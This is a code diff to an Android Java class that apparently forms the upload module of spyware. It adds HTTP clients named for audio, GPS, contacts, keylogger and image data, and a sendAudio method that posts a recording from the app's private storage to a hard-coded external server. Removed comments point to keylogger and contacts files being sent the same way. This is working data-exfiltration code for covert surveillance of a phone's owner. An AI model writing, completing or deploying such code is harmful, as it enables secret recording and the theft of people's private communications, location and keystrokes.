@@ -1,6 +1,5 @@
 package com.example.project;
 
-import android.content.Context;
 import android.util.Log;
 
 import java.io.File;
@@ -16,63 +15,31 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class okHTTP3 {
-    OkHttpClient client = new OkHttpClient();
-    OkHttpClient client1 = new OkHttpClient();
-    OkHttpClient client2 = new OkHttpClient();
-    OkHttpClient client3 = new OkHttpClient();
+    OkHttpClient audioclient = new OkHttpClient();
+    OkHttpClient gpsclient = new OkHttpClient();
+    OkHttpClient contactclient = new OkHttpClient();
+    OkHttpClient keyloggerclient = new OkHttpClient();
+    OkHttpClient imageclient = new OkHttpClient();
 
+    final static String DIRECTORY_PATH = "/data/data/com.example.project/";
+    final static String URL = "https://eloquent-snyder.cloud/receivefile.php";
 
-    public void sendFile(Context context){
-//  String filepath = "/data/data/com.example.project/files" + "/Keylogger.txt";
-//        String filepath = "/data/data/com.example.project/files/Contacts.txt";
-//        String filepath2 = "/data/data/com.example.project/filestest.jpg";
-        String filepath = "/data/data/com.example.project/files/test.mp4";
-        String url = "https://eloquent-snyder.cloud/receivefile.php";
+    public void sendAudio(){ // Recurse directory and send files with .mp4
+        String filepath = "/data/data/com.example.project/Recording_20230216_172015.mp4";
         File file = new File(filepath);
-//        File file1 = new File(filepath1);
-//        File file2 = new File(filepath2);
-//        File file3 = new File(filepath3);
-//        RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);
-//        RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);
-//        RequestBody fileBody2 = RequestBody.create(MediaType.parse("image/jpeg"), file2);
         RequestBody fileBody = RequestBody.create(MediaType.parse("audio/mp4"), file);
-//
+
         RequestBody requestBody = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("file", file.getName(), fileBody)
                 .build();
-//        RequestBody requestBody1 = new MultipartBody.Builder()
-//                .setType(MultipartBody.FORM)
-//                .addFormDataPart("file", file1.getName(), fileBody1)
-//                .build();
-//        RequestBody requestBody2 = new MultipartBody.Builder()
-//                .setType(MultipartBody.FORM)
-//                .addFormDataPart("file", file2.getName(), fileBody2)
-//                .build();
-//        RequestBody requestBody3 = new MultipartBody.Builder()
-//                .setType(MultipartBody.FORM)
-//                .addFormDataPart("file", file3.getName(), fileBody3)
-//                .build();
-//
-//
+
         Request request = new Request.Builder()
-                .url(url)
+                .url(URL)
                 .post(requestBody)
                 .build();
-//        Request request1 = new Request.Builder()
-//                .url(url)
-//                .post(requestBody1)
-//                .build();
-//        Request request2 = new Request.Builder()
-//                .url(url)
-//                .post(requestBody2)
-//                .build();
-//        Request request3 = new Request.Builder()
-//                .url(url)
-//                .post(requestBody3)
-//                .build();
-//
-        client.newCall(request).enqueue(new Callback() {
+
+        audioclient.newCall(request).enqueue(new Callback() {
             @Override
             public void onFailure(Call call, IOException e) {
                 e.printStackTrace();
@@ -88,55 +55,9 @@ public class okHTTP3 {
                 Log.i("send","sent");
             }
         });
-//
-//        client1.newCall(request1).enqueue(new Callback() {
-//            @Override
-//            public void onFailure(Call call, IOException e) {
-//                e.printStackTrace();
-//            }
-//
-//            @Override
-//            public void onResponse(Call call, Response response) throws IOException {
-//                if (!response.isSuccessful()) {
-//                    // Handle the failure
-//                    throw new IOException("Unexpected code " + response);
-//                }
-//                // Delete the file if the response was successful
-//                Log.i("send","sent");
-//            }
-//        });
-//        client2.newCall(request2).enqueue(new Callback() {
-//            @Override
-//            public void onFailure(Call call, IOException e) {
-//                e.printStackTrace();
-//            }
-//
-//            @Override
-//            public void onResponse(Call call, Response response) throws IOException {
-//                if (!response.isSuccessful()) {
-//                    // Handle the failure
-//                    throw new IOException("Unexpected code " + response);
-//                }
-//                // Delete the file if the response was successful
-//                Log.i("send","sent");
-//            }
-//        });
-//
-//        client3.newCall(request3).enqueue(new Callback() {
-//            @Override
-//            public void onFailure(Call call, IOException e) {
-//                e.printStackTrace();
-//            }
-//
-//            @Override
-//            public void onResponse(Call call, Response response) throws IOException {
-//                if (!response.isSuccessful()) {
-//                    // Handle the failure
-//                    throw new IOException("Unexpected code " + response);
-//                }
-//                // Delete the file if the response was successful
-//                Log.i("send", "sent");
-//            }
-//        });
+    }
+
+    public void sendTextandImage(){
+
     }
 }
